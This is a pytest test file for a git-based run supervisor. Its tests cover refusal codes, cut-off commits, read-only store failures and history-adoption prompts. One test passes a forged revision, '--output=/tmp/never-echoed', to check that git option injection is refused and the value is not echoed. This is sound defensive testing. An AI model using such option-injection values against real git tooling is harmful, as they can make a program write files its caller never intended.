    git = h.workspace(repo).git
    head = rev(repo, "HEAD")
    forged = "--output=/tmp/never-echoed"
    for call, named in (
        (lambda: git.changed_paths(forged, head), "the older commit"),
        (lambda: git.changed_paths(head, forged), "the newer commit"),
        (lambda: git.is_ancestor(forged, head), "the older commit"),
        (lambda: git.rev_list(head, forged), "the newer commit"),
    ):
        with pytest.raises(h.commit_module.SupervisorGitError) as caught:
            call()
        assert caught.value.code == "denied-invalid-revision"
        assert named in str(caught.value) and forged not in str(caught.value)


def test_a_ref_creation_record_failing_names_an_existing_directory(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = started(tmp_path)
    advance(repo, controller(repo, tmp_path), calc_implement)
    make_legacy(repo)

    def store_fails(*args: Any, **kwargs: Any) -> None:
        raise OSError("the store is read-only")

    monkeypatch.setattr(h.commit_module.GitPort, "write_product_record", store_fails)
    code, out = h.run_cli(repo, "next", h.SPEC_DIR)
    monkeypatch.undo()
    assert code == 1 and out["refusal"]["code"] == "denied-product-record", out
    detail = out["refusal"]["detail"]
    assert "created" in detail and "does not record it yet" in detail
    assert _named_directory(detail) == _nearest_existing(_store_path(repo))
    assert "request" in next_ok(repo)  # a retry records it


# ── provenance is never claimed, and every verb refuses in the unrecorded-step state ──


def _cut_off_step(repo: Path, monkeypatch: pytest.MonkeyPatch) -> str:
    ws = h.workspace(repo)
    run_id = ws.approvals()[0]["run_id"]

    def hook(name: str) -> None:
        if name == "refs-moved":
            raise h.Crash(name)

    h.commit_module.set_kill_hook(hook)
    try:
        with pytest.raises(h.Crash):
            ws.git.build_commit(run_id=run_id, step="cut", operation="evidence",
                                summary="cut off", appends={"review-decisions.jsonl": b"{}\n"})
    finally:
        h.commit_module.set_kill_hook(None)
    return rev(repo, "HEAD")


def test_the_decision_wording_is_the_same_for_a_cut_off_step_and_a_users_commit(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    cut = started(tmp_path / "cut")
    advance(cut, controller(cut, tmp_path / "cut"), calc_implement)
    step = _cut_off_step(cut, monkeypatch)
    cut_question = next_ok(cut)["request"]["question"]
    user = started(tmp_path / "user")
    advance(user, controller(user, tmp_path / "user"), calc_implement)
    commit = foreign_commit(user)
    user_question = next_ok(user)["request"]["question"]
    for question, named in ((cut_question, step), (user_question, commit)):
        assert f"commit {named}, which this run never recorded" in question
        assert "either a step the supervisor was committing when it was cut off" in question
        assert "or a commit made outside the supervisor" in question
    # Adoption is offered only where an answer would be admitted: not for a step that
    # changes delivery/, and for a commit that does not.
    assert "Adoption would be refused" in cut_question
    assert "adopt-history" in user_question and "Adoption would be refused" not in user_question


def test_a_non_amending_start_refuses_in_the_unrecorded_step_state(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    repo = started(tmp_path)
    advance(repo, controller(repo, tmp_path), calc_implement)
    _cut_off_step(repo, monkeypatch)
    code, out = h.start(repo)  # the same pair: nothing to amend
    assert code == 1 and out["refusal"]["code"] == "history-adoption-required", out
    assert "Restore:" in out["refusal"]["detail"]
    status_code, status = h.run_cli(repo, "status", h.SPEC_DIR, "--json")
    assert status_code == 0 and status["request"]["reason"] == "history-adoption"


@pytest.mark.skipif(
    os.name == "nt" or (hasattr(os, "geteuid") and os.geteuid() == 0),
    reason="a read-only directory is how this test fails a real store write",
)
def test_an_unwritable_store_fails_the_write_that_records_a_step(tmp_path: Path) -> None:
    repo = started(tmp_path)
    advance(repo, controller(repo, tmp_path), calc_implement)
    ws = h.workspace(repo)
    run_id = ws.approvals()[0]["run_id"]
    store = store_dir(repo)
    recorded = rev(repo, "HEAD")
    # The store goes read-only after the transaction has been checked, just before it runs.
    h.commit_module.set_update_hook(lambda: Path(store).chmod(0o555))
    try:
        with pytest.raises(h.commit_module.SupervisorGitError) as caught:
            ws.git.build_commit(run_id=run_id, step="moved-step", operation="evidence",
                                summary="moved, then the store was read-only")
    finally:
        h.commit_module.set_update_hook(None)
        Path(store).chmod(0o755)
    assert caught.value.code == "denied-product-record"
    assert "MutationDenied" in str(caught.value) and str(store) in str(caught.value)
    assert "writable" in str(caught.value)
    assert rev(repo, "HEAD") != recorded and record(repo)["recorded"] == recorded
    request = next_ok(repo)["request"]
    assert request["reason"] == "history-adoption"
    run_restore_exit(repo, request["question"])
    assert "request" in next_ok(repo)
